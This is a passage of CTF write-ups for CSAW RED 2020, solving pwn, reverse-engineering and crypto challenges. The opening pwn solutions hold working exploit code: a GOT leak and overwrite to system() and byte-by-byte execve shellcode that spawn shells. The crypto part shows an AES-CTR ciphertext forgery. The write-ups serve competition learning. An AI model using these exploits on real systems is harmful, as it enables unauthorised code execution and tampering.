[*] '/home/darin/ctfs/red-2020/party/partycreation'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Note that `getIntClean()` uses `atoi()` to get an integer, meaning we can input negative indices.

```c
int getIntClean(){
    char input[MAXINTLENGTH];
    getInput(MAXINTLENGTH, input);
    return atoi(input);
}
```

Since the binary does not use Full RELRO, we can easily leak and overwrite some GOT values. A good choice is `atoi()`, since it is called with our input as the first argument.

```python
view(-4)
r.recvuntil("Name:         ")
libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.sym["atoi"]
log.info(f"LIBC @ 0x{libc.address:x}")
```

From here we can use the rename function to write `system()` to `atoi@GOT`, and send `/bin/sh` to get a shell.

```python
rename(-4, p64(libc.sym["system"]))
r.sendline("/bin/sh")
```

## Flag
```
flag{3v3ry_CTF_t34m_15_4_p4r7y}
```

# pwn - Level 3 Spellcode
> Pit your shellcoding skills against an admin! May the best spellcoder win. `nc pwn.red.csaw.io 5011` (NOTE: if you experience issues writing to offset `0` in the shellcode array, try writing to offsets `1` and later. The challenge is solvable without needing that first byte. Edit posted Wednesday morning.)

## Files
- level\_3\_spellcode

## Solution
```
$ checksec level_3_spellcode
[*] '/home/darin/ctfs/red-2020/level3/level_3_spellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This one is certainly more interesting than the previous ones. Instead of letting us input all our shellcode at once, we can only input one byte at an offset. This sounds impossible, but the program writes some code to the shellcode first.

```
   0x6020c0:    nop
   0x6020c1:    nop
   0x6020c2:    nop
   0x6020c3:    nop
   0x6020c4:    nop
   0x6020c5:    nop
   0x6020c6:    nop
   0x6020c7:    nop
   0x6020c8:    nop
   0x6020c9:    nop
   0x6020ca:    nop
   0x6020cb:    nop
   0x6020cc:    nop
   0x6020cd:    nop
   0x6020ce:    nop
   0x6020cf:    nop
   0x6020d0:    nop
   0x6020d1:    nop
   0x6020d2:    nop
   0x6020d3:    nop
   0x6020d4:    nop
   0x6020d5:    nop
   0x6020d6:    nop
   0x6020d7:    nop
   0x6020d8:    nop
   0x6020d9:    nop
   0x6020da:    nop
   0x6020db:    nop
   0x6020dc:    nop
   0x6020dd:    nop
   0x6020de:    nop
   0x6020df:    sub    rsp,0x8
   0x6020e3:    jmp    0x400bf6
```

Our first goal will be to get more writes. We can do this by changing one byte at the last `jmp` instruction. After some trial and error with different offsets, we find that writing `0x28` at offset 36 will change the `jmp` instruction to this:

```
   0x6020e3:    jmp    0x400c10
```

This loops us back to the before the input function is called. Note that testing this on Ubuntu will likely cause a segfault due to stack alignment, but testing this on the remote reveals that the remote libc does not care about stack alignment and continues without a problem.

Eventually, the goal should be to write the shellcode where the nops currently are. However, writing this one byte at a time (and executing it each time) means that the program will encounter an invalid instruction when we are not done writing it yet. Therefore, we need a way to jump over the nops temporarily.

We would like to write `0xeb 0x21` which is `jmp 0x6020e3`, but we can not write the first byte or else it will become `0xeb 0x90` which will jump too far. To fix this, we will first write a `0x68` to offset 0 to turn the first instruction into a `push 0xffffffff90909090`. Then, we'll write the `0x21`, which makes the first instruction `push 0xffffffff90909021`. Lastly, we'll write the `0xeb` to get the `jmp 0x6020e3` we want.

Now, we simply write the shellcode one byte at a time. However, we must keep in mind that we will later "enable" this shellcode by changing the offset in our first jump instruction. This byte is at offset 1, and we can not write null bytes, so the lowest place we can start writing the shellcode is at offset 3. Once the shellcode is written, flipping byte 1 to a `0x01` enables the shellcode and we get a shell.

```python
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.recvuntil("Counterspell")
r.sendline("3")
write(36, b"\x28") # loop
write(0, b"\x68") # nop
write(1, b"\x21") # jump
write(0, b"\xeb") # jump

for k, b in enumerate(sc):
    write(k+3, b'%c'%b)

write(1, b"\x01")
r.interactive()
```

## Flag
```
flag{pu7_0n_y0ur_m1rr0r_5h4d35_4nd_t4k3_a_b0w_5p3llc0d3r}
```

# rev - concrete_trap
> I put my valuables behind a perfect knowledge lock. Don't bother. `nc rev.red.csaw.io 5002`

## Files
- concrete_trap

## Solution
```c
int main(void)

{
  int i;

  init();
  puts("Welcome to my intricate trap, where all who are not me shall fail.");
  i = stage1();
  if (i == 0) {
    fail();
  }
  puts("I am slightly convinced you are me. Proceed.");
  i = stage2();
  if (i == 0) {
    fail();
  }
  puts("There are only a couple bazillion pairs of numbers I like. You might be me.");
  i = stage3();
  if (i == 0) {
    fail();
  }
  puts("Amazing");
  give_flag();
  return 0;
}
```

All we need to do is pass each stage. Stage 1 is relatively simple - it is simply an inlined `strcpy()` followed by a `strcmp()`. We can get the correct string with a debugger or by using Ghidra's `Convert` feature.

![Stage 1](./concrete/stage1.png)

```
Stage 1: u_will_never_guess_this_because_its_so_long
```

Stage 2 involves a short function.

```c
bool stage2(void)

{
  bool ret;
  int x;
  int y;
  int a;
  int b;

  x = 0;
  y = 0;
  puts("What are my two numbers?");
  scanf("%d %d",&x,&y);
  if ((x < 0x32) || (y < 0x32)) {
    ret = false;
  }
  else {
    a = x;
    b = y;
    while (0x0 < b) {
      a = a ^ y + x * b;
      b = b - 1;
    }
    ret = a == 0x7a69;
  }
  return ret;
}
```

This is simple enough that we can just brute force it until we get a good pair of numbers. Feel free to do some mathematical analysis on your own.

```python
def try_stage2(x, y):
  a, b = x, y
  while 0 < b:
    a = a^y + x*b
    b -= 1
  return a & 0xffffffff

def stage2():
  for x in range(0x32, 0xffffffff):
    if try_stage2(x, 0x33) == 0x7a69:
      return x
      break
```

```
Stage 2: 16690 51
```

Stage 3 is much more complex.

```c
bool stage3(void)

{
  char a;
  char b;
  int v;
  int w;
  int x;
  int y;
  int z;
  int i;
  long local_10;

  puts("Even I haven\'t figured this one out yet");
  scanf("%d %d %d %d %d",&v,&w,&x,&y,&z);
  i = 0x0;
  while (i < 0x5) {
    a = (char)y;
    v = w >> ((char)x + a * (char)v & 0x1fU);
    b = (char)z;
    w = y << (b - a * (char)v & 0x1fU);
    x = z >> ((char)v + (char)x * (char)w & 0x1fU);
    y = w << ((char)x - a * b & 0x1fU);
    z = x >> ((char)y + (char)w * b & 0x1fU);
    i = i + 0x1;
  }
  return z + v + w + x + y == 0x7a69;
}
```

This is much too big to brute force. Instead, we'll use symbolic execution with [angr](https://angr.io/).

```python
import angr

proj = angr.Project("./concrete_trap", main_opts={'base_addr': 0x400000})
state = proj.factory.entry_state(addr=0x400b8c)
v = state.solver.BVS('v', 32)
w = state.solver.BVS('w', 32)
x = state.solver.BVS('x', 32)
y = state.solver.BVS('y', 32)
z = state.solver.BVS('z', 32)
state.memory.store(state.regs.rbp-0x20, v)
state.memory.store(state.regs.rbp-0x1c, w)
state.memory.store(state.regs.rbp-0x18, x)
state.memory.store(state.regs.rbp-0x14, y)
state.memory.store(state.regs.rbp-0x10, z)

sm = proj.factory.simulation_manager(state)
sm.explore(find=0x400c4a, avoid=0x400c51)

def stage3():
  if sm.found:
    state = sm.found[0]
    print(state.solver.eval(v.reversed), state.solver.eval(w.reversed), state.solver.eval(x.reversed), state.solver.eval(y.reversed), state.solver.eval(z.reversed))
```

```
Stage 3: 14 6144 29 2053472513 1344348227
```

Submitting all three stages gives us the flag.

## Flag
```
flag{symb0l1c_v1ct0r13s_4r3_jUst_4s_g00d}
```

# rev - Proprietary
> Greetings, employee #9458. Please ensure that our DRM software is sufficiently secure.
>
> `nc rev.red.csaw.io 5004`

## Files
- proprietary

## Solution
There is an inlined `strcpy()` followed by a `strcmp()`. There are a few operations done on this string before the compare but notice that our input is not changed or referenced in the calculation.

```c
local_28 = 0x7075737265707573;
local_20 = 0x7372657075737265;
local_18 = 0x6d72647465726365;
local_10 = 0x0;
local_48 = 0x756c656572666f6e;
local_40 = 0x726f2d736568636e;
local_38 = 0x6572617774666f73;
local_30 = 0x0;
local_68 = 0x6967657361656c70;
local_60 = 0x79656e6e756d6576;
local_58 = 0x7369646573756f74;
local_50 = 0x0;
local_c = 0x0;
while (local_c < 0x19) {
local_88[(int)local_c] =
     *(byte *)((long)&local_28 + (long)(int)local_c) ^
     *(byte *)((long)&local_48 + (long)(int)local_c);
local_88[(int)local_c] =
     local_88[(int)local_c] ^ *(byte *)((long)&local_68 + (long)(int)local_c);
local_c = local_c + 0x1;
}
iVar1 = strcmp(param_1,(char *)local_88);
return iVar1 == 0x0;
```

Therefore, we don't need to do any reversing and can just grab the correct value out of a debugger.

```
strcmp@plt (
   $rdi = 0x00007fffffffda60 → "kitkat<3\n",
   $rsi = 0x00007fffffffd9d0 → "mvsvds~l}tvem&xxbcabfai{",
   $rdx = 0x00007fffffffd9d0 → "mvsvds~l}tvem&xxbcabfai{"
)
───────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "proprietary", stopped 0x555555555275 in trademark (), reason: BREAKPOINT
```

Sending `mvsvds~l}tvem&xxbcabfai{` to the server gives the flag.

## Flag
```
flag{fr3e_n_0p1n_so@rce_xd}
```

# rev - Recursive
> Onions have layers. Recursions have layers.
>
> `nc rev.red.csaw.io 5000`

## Files
- recursive

```c
  puts("Enter a number from 1 to 99999:");
  fgets(buf, 0x6, stdin);
  input = atoi(buf);
  if (0x0 < input) {
    x = f(input, &i);
  }
  if ((i == 0x7) && (x + 0x7 == 0x18 - 0x6)) {
    flag = fopen("flag.txt","r");
    fgets(flagbuf, 0x18, flag);
    puts(flagbuf);
  }
```

Okay, so we'd like `f()` to return 11. We just need to see what `f()` does to `i`.

```c
int f(int x, int *i)
{
  if ((x & 0x1U) == 0x0) {
    *i = *i + 0x1;
    x = f(x / 0x2, i);
  }
  return x;
}
```

This function checks if `x` is even. If it is, it will divide it by 2 and recurse, incrementing `i`. Otherwise, it will simply return x. Therefore, if we want `i` to be 7, we must have 7 factors of 2. Since we want the return value to be 11, our value must be 2^7 * 11.

Sending 1408 gives us the flag.

## Flag
```
flag{r3Curs1Ve_Rev3rSe}
```

# rev - spaghetti
> Due to technical difficulties, we can only give you the source our intern wrote. We told them to ensure they were using secure coding standards, but they ended up with this... `nc rev.red.csaw.io 5001`

## Files
- spaghetti.c

## Solution
We see many macros at the top, then the bulk of the code is just a bunch of `eeeeee`.

```c
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee !
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "%s"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "%s\n"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "0"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "2"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "=a"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "=b"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "=c"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "=d"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "cpuid"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "flag.txt"
#define eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee "r"
#define e #
```

To expand these macros, we can use `gcc -E`. We don't care about most of this, but we can take the important functions and run them through a C formatter.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE 2048

static inline void wrapper(uint32_t * eax, uint32_t * ebx, uint32_t * ecx, uint32_t * edx) {
  asm volatile("cpuid": "=a"( * eax), "=b"( * ebx), "=c"( * ecx), "=d"( * edx): "0"( * eax), "2"( * ecx));
}

void win(void) {
  FILE * file;
  char buf[255];
  file = fopen("flag.txt", "r");
  if (!file) return;
  fscanf(file, "%s", buf);
  printf("%s\n", buf);
  fclose(file);
}

int main(int argc, char * argv[]) {
  setvbuf(stdout, ((void * ) 0), 2, 0);
  uint32_t eax = 0;
  char input[17];
  fgets(input, sizeof(input), stdin);
  char * buf = malloc(sizeof(char) * 17);
  buf[0] = 'C';
  buf[1] = 'P';
  buf[2] = 'U';
  buf[3] = ':';
  wrapper( & eax, (uint32_t * ) & buf[4], (uint32_t * ) & buf[12], (uint32_t * ) & buf[8]);
  buf[16] = '\0';
  if (strncmp(buf, input, 17) == 0) win();
  free(buf);
  return 0;
}
```

This uses the `cpuid` instruction to get the CPU vendor ID, then compares it to our input. I have an AMD CPU, so the correct answer is `CPU:AuthenticAMD`.

```
$ ./spaghetti
CPU:AuthenticAMD
FLAG
```

We just need to guess what kind of CPU the remote server has. It turns out to be a `GenuineIntel`.

## Flag
```
flag{s0m3b0dy_t0ucha_my_spagh3tt}
```

# rev - parasprite
> This challenge is graciously contributed by Pacific Northwest National Laboratory. To convert their flag to our flag format, replace a string like `"hello world"` with `flag{hello world}` (keeping the space, no underscore) when submitting the flag. If you have any trouble with the flag submission, ping the MailBot on Discord.

## Files
- parasprite

## Solution
The binary is a .NET executable, making decompilation trivial. Use dotPeek or dnSpy for this.

```csharp
public string getFlagText()
{
    return Encoding.UTF8.GetString(Convert.FromBase64String(SeasonOne.Everfree + EpisodeTen.Trixie));
}
```

Easy enough.

```csharp
public static string Everfree = "VGhlIGZsYWcgaXM6ICJVZ2guIE5vdyBJIGdvd";
public static string Trixie = "HRhIGdvIGZpbmQgYSB0cjBtYjBuMyA+Ljwi"
```

Concatenating these two and base64-decoding gives the flag.

## Flag
```
flag{Ugh. Now I gotta go find a tr0mb0n3 >.<}
```

# rev - cracked
> i just want to be happy.

## Files
- cracked

## Solution
Running the binary and sending some input doesn't seem to output anything.

```c
void main(void)
{
  int i;
  void *memory;
  char *ret;

  memory = mmap((void *)0x0,0xc8,0x3,0x22,-0x1,0x0);
  __printf_chk(0x1, "> ");
  fgets((char *)((long)memory + 0x64),0x32,stdin);
  i = run(memory);
  if (i == 0x0) {
    ret = ":(";
  }
  else {
    ret = "yay";
  }
  puts(ret);
  return;
}
```

This starts simple. Our input is written to `memory+100`, we just need `run()` to return 1. Now what does `run()` look like?

![Function graph for run](./cracked/graph.png)

Yikes. Note that due to the way this is written (as well as how Ghidra handles switch cases) it is best to ignore the decompilation and focus mainly on the disassembly and function graph.

The first section is relatively simple. All it does is save the argument in R9, then load a bunch of bytes from memory onto the stack. RDX and RDI also point to this stack. Some registers are also set to point to some memory locations.

![Loading bytes](./cracked/load.png)

Next we enter a loop. The first thing it does is call the function at `0x8c0` with arguments `0x4d1, 0`. We could take a look at this function, realize it is a big recursive function, then reimplement it with dynamic programming to obtain the correct return value. However, we should note that the value is simply thrown away - it is stored behind the current array pointer. Therefore, we can patch this out to a simple `return 0`.

If we run the new patched binary, we see that it actually produces output.

```
$ ./cracked_patch
> kitkat<3
:(
```

The next thing the loop does is load the first byte at the stack and compare it to a bunch of different values.

![compare instructions](./cracked/compare.png)

This is a switch case. Lets take a look at what each of these values do. The first one is 0, and is quite simple.

![AL = 0](./cracked/case0.png)

All this does is add 1 to RDX, then loop back to the beginning if RDX is less than RCX. Before we move on to the next jump, lets look at what happens if the jump is not taken.

![return sequence](./cracked/return.png)

Ah, so this is where the function returns. We can group these vertices together and label them. Note the return is the value of some memory location; this will be important later.

![grouped vertices](./cracked/grouped.png)

Now lets look at switch case 1.

![switch case 1](./cracked/case1.png)

First it loads the byte after the 1 into EDI, then compares it to 0x61, 0x62, and 0x63, setting RAX to R8, R10, and R11, respectively. Recall that these are pointers to some memory locations. Note that the byte after this one is loaded into ESI. After this, another function is called that is quite short.

![short function](./cracked/shortfunction.png)

This continues to compare DIL to 0x64 and 0x65, setting RAX to even more memory locations. If DIL is not 0x61-0x65, 0 is returned. We'll label the memory locations that these correspond to, noting that 0x61-0x65 is a-e in ASCII.

![labeling a-e](./cracked/aelabels.png)

Thus, this long sequence simply sets RAX to a-e depending on the second byte after the 1.

![setting RAX to a-e](./cracked/setrax.png)

The next part of the code just sets the selected memory location to the second byte in ESI, then jumps down to the return if RDX has reached a certain value.

![moving constant into register](./cracked/constreg.png)

At this point, we start to get an idea for what this binary does. The long string of bytes loaded at the beginning is a custom bytecode, similar to regular assembly. There are only a couple of instructions in this language, and we have just reversed the first two. The memory locations referred to with a-e are our five registers, and RDX acts as a program counter. At the end, the value returned is the value of register d, so it is our goal to make this 1.

Since we're lazy, we can just write an angr script to do this.

```python
import angr
import claripy

start = 0x400e2e
find = 0x400e48
avoid = 0x400e37

p = angr.Project("./cracked_patch")
state = p.factory.entry_state(addr=start)
flag = claripy.BVS("input", 8*37)
for i in range(37):
  state.add_constraints(flag.get_byte(i) != 0)
state.memory.store(state.regs.rdi+100, flag)

sm = p.factory.simulation_manager(state)
sm.explore(find=find, avoid=avoid)

if sm.found:
  print(sm.found[0].solver.eval(flag, cast_to=bytes))
```

Running this for about 10 minutes gives the flag.

But wait! That's lame. In an effort to please the great Jason An, we can continue to reverse the rest of the instructions. We've already done most of the hard work, the rest is just recognizing patterns. So far, we have this:

![simplified graph so far](./cracked/partialgraph.png)

We can continue for opcode 2. The first thing it does is familiar, but this time it loads two registers instead of 1.

![loading two registers](./cracked/loadtwo.png)

The first register is stored in RBX and the second is in RAX. Then, it moves the value pointed to by RAX into the value pointed to by RBX. This is a simple `mov reg, reg` instruction.

Opcode 3 is a bit different. It again selects two registers, but then does not set their values directly.

![opcode 3](./cracked/case3.png)

The value of the first register is used as an offset from R9, which if you recall from the beginning points to the big mmap chunk. This must be our RAM. Now we understand that addresses are all one byte (which is more than enough to address the 200-byte mmap chunk). This instruction is `mov [reg], reg`. Opcode 4 is very similar; it is `mov reg, [reg]`.

Opcode 5 and 6 are simple; they are `inc reg` and `dec reg`, respectively. Opcode 7 is `imul reg, reg`.

Opcode 8 is `and reg, 0xff`. Recall that everything is one byte, so this is required to make arithmetic and other operations work, since the VM is implemented with x86_64. For the purpose of the bytecode, this is basically a NOP.

Opcode 9 is `xor reg, reg`. The final opcode, number 10, is a bit more complex.

![opcode 10](./cracked/case10.png)


If the first register is 0, it stays 0. Otherwise, the second and third registers are compared and the if they are equal, the first register is set to 1. This must be how comparisons are made and the return value is set.

At this point, we have greatly simplified the function graph.

![simplified function graph](./cracked/fullgraph.png)

From here, we can extract the bytecode and write a disassembler. Ghidra actually has an excellent framework for writing custom architectures, using a combination of XML and [Sleigh](https://ghidra.re/courses/languages/html/sleigh.html). I have never used this before, so wanted to take the opportunity to try it out. The code is not very neat, but works pretty nicely.

cracked.ldefs sets some information about the language.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<language_definitions>
  <language processor="CSAW RED 2020 cracked"
            endian="little"
            size="8"
            variant="default"
            version="1.0"
            slafile="cracked.sla"
            processorspec="cracked.pspec"
            id="CRACKED:LE:8:default">
    <description>CSAW RED 2020 cracked</description>
    <compiler name="default" spec="cracked.cspec" id="default"/>
  </language>
</language_definitions>
```

cracked.pspec sets some information about the processor. Note that we set the default  memory block to `ram:0x00` so Ghidra will auto-analyze the beginning of the file.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<processor_spec>
  <programcounter register="PC"/>
  <default_symbols>
    <symbol name="start" address="rom:0x0000" type="code" entry="true"/>
  </default_symbols>
  <default_memory_blocks>
    <memory_block name="ram" start_address="ram:0x00" length="200" mode="rw" initialized="true" />
  </default_memory_blocks>
</processor_spec>
```

cracked.cspec sets some information about the compiler. Note that even though this language does not have a stack (or any branching, for that matter), we still need to point the stack somewhere or else the Ghidra decompiler will crash. We also set the return value to be the D register.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<compiler_spec>
  <global>
    <range space="ram"/>
    <range space="rom"/>
  </global>
  <stackpointer register="fake_sp" space="fake_stack" growth="negative"/>
  <default_proto>
    <prototype name="default" extrapop="unknown" stackshift="0">
      <input></input>
      <output>
        <pentry minsize="1" maxsize="1">
          <register name="D" />
        </pentry>
      </output>
      <unaffected>
        <register name="fake_sp" />
      </unaffected>
    </prototype>
  </default_proto>
</compiler_spec>
```

cracked.slaspec is the important bit. We define some properties, then memory spaces and registers. ROM needs to be 2-byte addressed, or else the bytecode will not fit. Everything else is 1 byte. I've also added an additional RET instruction, which I've borrowed the opcode for from x86. CPS is short for "compare-setz".
```
define endian=little;
define alignment=1;

define space rom type=ram_space size=2 default;
define space ram type=ram_space size=1;
define space register type=register_space size=1;

define space fake_stack type=ram_space size=1 wordsize=1;

define register offset=0 size=1 [ A B C D E fake_sp ];
define register offset=8 size=2 [ PC ];

define token opbyte (8)
  op = (0, 7)
;

define token reg1 (8)
  reg1_1 = (0, 2)
;

define token reg2 (16)
  reg2_1 = (0, 2)
  reg2_2 = (8, 10)
;

define token reg3 (24)
  reg3_1 = (0, 2)
  reg3_2 = (8, 10)
  reg3_3 = (16, 18)
;

define token data8 (8)
  imm8 = (0, 7)
;

attach variables [
  reg1_1
  reg2_1
  reg2_2
  reg3_1
  reg3_2
  reg3_3
] [ _ A B C D E _ _ ];

:NOP is op=0 {
  A=A;
}

:MOV reg1_1, imm8 is op=1; reg1_1; imm8 {
  reg1_1 = imm8;
}

:MOV reg2_1, reg2_2 is op=2; reg2_1 & reg2_2 {
  reg2_1 = reg2_2;
}

:MOV "["^reg2_1^"]", reg2_2 is op=3; reg2_1 & reg2_2 {
  *[ram]:1 reg2_1 = reg2_2;
}

:MOV reg2_1, "["^reg2_2^"]" is op=4; reg2_1 & reg2_2 {
  reg2_1 = *[ram]:1 reg2_2;
}

:INC reg1_1 is op=5; reg1_1 {
  reg1_1 = reg1_1 + 1;
}

:DEC reg1_1 is op=6; reg1_1 {
  reg1_1 = reg1_1 - 1;
}

:MUL reg2_1, reg2_2 is op=7; reg2_1 & reg2_2 {
  reg2_1 = reg2_1 * reg2_2;
}

:AND reg1_1 is op=8; reg1_1 {
  reg1_1 = reg1_1 & 0xff;
}

:XOR reg2_1, reg2_2 is op=9; reg2_1 & reg2_2 {
  reg2_1 = reg2_1 ^ reg2_2;
}

:CPS reg3_1, reg3_2, reg3_3 is op=10; reg3_1 & reg3_2 & reg3_3 {
  reg3_1 = reg3_1 && (reg3_2 == reg3_3);
}

:RET is op=0xc3 {
  return [D];
}
```

After compiling the slaspec and decoding the bytecode to a file, we can open it in Ghidra, selecting our new custom language.

![loading bytecode into Ghidra](./cracked/loadbytecode.png)

Automatic analysis decompiles some of the function, but not all of it. The problem is that after loading a bunch of bytes, no memory is written, so Ghidra assumes that it is not important and refuses to decompile it. We can use the memory manager in Ghidra to add a single-byte block right after the bytecode with a single return instruction, which tells Ghidra that the value of the D register is important.

![adding a return](./cracked/addreturn.png)

Pressing D to disassemble the instruction results in the decompilation being more complete. We see the memory at offset 100 (0x64) being referenced, which is our input. Renaming and retyping as usual gives us the decompilation we're after.

![interesting decompilation](./cracked/decompilation.png)

First, a bunch of bytes are loaded into `array`. Then, starting at memory index 0x64 (our input), each byte is multiplied by 3 and XORed with the index, comparing the result to `array`. Keep in mind that all of this is modulo 256, since everything is 1 byte. All we need to do is solve this modular equation for each byte.

```python
chars="""
0x56
0x21
0x45
0x52
0x19
0x2e
0xfa
0x2c
0xc2
0x8
0xf7
0x72
0x48
0xed
0x10
0xea
0x69
0x17
0xe5
0x21
0x24
0x26
0xe6
0x3f
0xef
0x13
0xe7
0x29
0x9d
0x1d
0xde
0x9e
0xbc
0x15
0xc1
0x1e
0xff
""".strip().splitlines()

inv = pow(3, -1, 256)
chars = [int(x, 16) for x in chars]
print(''.join(chr((((i+0x64)^c)*inv)%256) for i, c in enumerate(chars)))
```

Running this gives the flag

## Flag
```
flag{m0m:w3_h4v3_v1rtu4l1z3r_4t_h0m3}
```

# crypto - Caesar, Salad Edition
> Can you crypto a salad?

## Files
- challenge.txt

## Solution
[Caesar cipher, but with numbers](https://planetcalc.com/8572/). Here's a [CyberChef](https://gchq.github.io/CyberChef/#recipe=Substitute('abcdefghijklmnopqrstuvwxyz0123456789','rstuvwxyz0123456789abcdefghijklmnopq')Substitute('ABCDEFGHIJKLMNOPQRSTUVWXY','RSTUVWXYZ0123456789ABCDEF')&input=Vjc2emF0Y2Q0dGMxNzZiLCBoN2QgYXg1dDE2IGMweCAzMTZ6IDE2IGMweCA2N2FjMC4gOGE3emF4YmIgYzcgYzB4IDZ4Z2MgdjB0NDR4Nnp4IGRiMTZ6IHk0dHp7ajQ0aF9rYl9jMG1fRm1iY21hN2IxX1VhZGNkb30).

## Flag
```
flag{0lly_1s_th3_W3st3rosi_Brutu5}
```

# crypto - Baby RSA
> RSA, Baby!

## Files
- babyrsa&#46;py
- output.txt

## Solution
We are given all the primes, so we can just decrypt the flag.

```python
import binascii

p = 145896397948599998942070905618125741707153262136737867091424206214863311983754798132506847247060933259992213922330093355384074106378364442605393772459083171436021544747431870220502473122335577465868694410639408967310464909028082243697605020201854956686511321982610510127021225253855714947995254455934112781237
q = 161789333941166786513228802552842399479088049833236637199242324991383562098097818066084413805418885235992146458159092358464142327262092920535911539932345324665659887571825176247963905044195793221547447580474637003954434401101992177452759184554002295355208152143245122998584310121314025484386443927943066105677
e = 65537
c = 12451913839018286854569781239987979411811904691314899591167709184435572524209346729056838996009078785392296838808134032699737175538797688392535397123804327010235227110065934112835174215600131394086207801011293631773912220128701724829574429013090166429677060320458634262848000875587275783765394948234677314007657694186176051479676214905183750670315958626900876117012552110970518896576916585743954570141539634424802569087749535506653074884938527705867191070440392566152622517385147411621415700060459999601041358325738464981510379266433835041749677645958206305101292483552201115137770533259992022675761065142122359282151

d = pow(e, -1, (p-1)*(q-1))
n = p*q
print(binascii.unhexlify(hex(pow(c, d, n))[2:]))
```

## Flag
```
flag{really_s1ck_algor1thm}
```

# crypto - Apple
> Crack the ciphertext to learn how apple cider vinegar is made!

## Files
- ciphertext.txt

## Solution
Simple vigenere cipher, use [dcode.fr](https://dcode.fr/vigenere-cipher) to get the flag.

## Flag
```
flag{V1g3n3re_C1ph3r}
```

# crypto - unary, binary, ...
> Sean Sears, the international Rock, Paper, Scissors champion, gives his adoring fans a thumbs-up after every bout. His grueling daily training routine starts with unary exercises, then progresses to binary, and then...

## Files
- challenge.pdf

## Solution
It's probably ternary, so we use [CyberChef](https://gchq.github.io/CyberChef/#recipe=Fork('','%5C%5Cn',false)To_Hex('Space',0)From_Base(16)To_Base(3)&input=ZmxhZw) to get the first few characters. Writing these on the PDF shows that the hand signs probably correspond to numbers and separators.

![the first few letters](./unary/first.png)

We [decode these by hand](https://gchq.github.io/CyberChef/#recipe=Fork('%20','',false)From_Base(3)To_Base(16)From_Hex('Auto')&input=MTAyMTAgMTEwMDAgMTAxMjEgMTAyMTEgMTExMjAgMTEwMDIgMTIxMSAxMDIwMCAxMjIwIDEwMTEyIDEwMDAxIDIyMjIgMTAwMDIgMTAxMTIgMTEwMjEgMTAyMjIgMTIxMSAxMTAwMCAxMTAwMCAxMTExMiAxMTEyMg) and get the flag.

## Flag
```
flag{n1c3_RPS_sk1llz}
```

# crypto - Teen RSA
> RSA, Teeny!

## Files
- teenrsa&#46;py
- output.txt

## Solution
The value of e is 3, which is quite small. All we need to do is take the cube root of the ciphertext to get the flag.

```python
import binascii
print(binascii.unhexlify(hex((21054947296948912186250291623999881612177917867294620912940663265128767538390407246183135081940602148334924270226808672133409885425114817372307202073496919198495962536909357503213718449515958555968598380737125).nth_root(3))[2:]))
```

## Flag
```
flag{where_did_my_primes_go?}
```

# crypto - prettyplease
> Applications for a cryptography flag are now open! Application deadline: September 27th, 20:00 UTC. `nc crypto.red.csaw.io 5012`

## Files
- server&#46;py

## Solution
The server uses AES-CTR mode to encrypt `Your application has been REJECTED`, and we would like to give it a valid encrypted string `Your application has been ACCEPTED`. The key observation is AES-CTR essentially turns the AES block-cipher into a stream cipher. Since we know the plaintext, we can recover the keystream and forge any signature.

```python
def xor(a, b):
    return bytes(x^y for x,y in zip(a,b))

token = base64.b64decode("C406F4HamiFzDBwXpFo0wlD+BWlbE5TpTCKXxudZwNVO/OqiFTVRrFMX/v3pkvR4U8I=")
iv = token[:16]
ct = token[16:]
ct = xor(xor(ct, b"Your application has been REJECTED"), b"Your application has been ACCEPTED")
print(base64.b64encode(iv+ct))
# b'C406F4HamiFzDBwXpFo0wlD+BWlbE5TpTCKXxudZwNVO/OqiFTVRrFMX7fvgkud4U8I='
```

Sending the forged signature gives the flag.

## Flag
```
flag{w3_n33d_m0r3_1n739r17y_1n_7h3_r3v13w_pr0c355}
```

# crypto - mindreader
> I'm thinking of a flag! Can you read my mind? (You don't actually have to guess the flag.) NOTE: when submitting the flag, do not include any padding bytes that were in the decrypted plaintext. `nc crypto.red.csaw.io 5011`

## Files
- server&#46;py

## Solution
The server uses AES-OFB to encrypt either a message we give or the flag. The key observation is that AES-OFB essentially turns the AES block-cipher into a stream cipher, so it is vulnerable in the same way as the previous challenge. In this case, we do not provide the IV, but it remains constant between encryptions. Thus, if we send a bunch of null bytes (base64 encoded), we will get the keystream (because x ^ 0 = x).

```
> 2

Enter the base64-encoded thought you would like the admin to think about:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
The admin is thinking: gN/GHgb/jsCCePRjySDBeLf18+u9rbLeB1SRlW4PTBJApbohpik12hkMnHDNGDMyguavrx1rb+BoPFUeXNGPQQ==

> 1

